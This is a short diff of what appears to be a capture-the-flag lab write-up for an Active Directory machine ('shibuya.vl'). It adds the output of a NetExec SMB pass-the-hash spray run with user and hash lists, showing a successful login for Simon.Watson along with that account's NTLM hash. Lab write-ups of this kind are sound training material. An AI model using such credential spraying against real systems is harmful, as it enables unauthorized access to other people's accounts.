@@ -269,8 +269,11 @@ Ill put all these hashes into a file
 ```python
 nxc smb AWSJPDC0522.shibuya.vl -u users.txt -H 'hashes.txt' --continue-on-success
 
-
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50
 ```
+Found that the hash for the operator is the hash for `simon.watson`
+
+
 
 
 
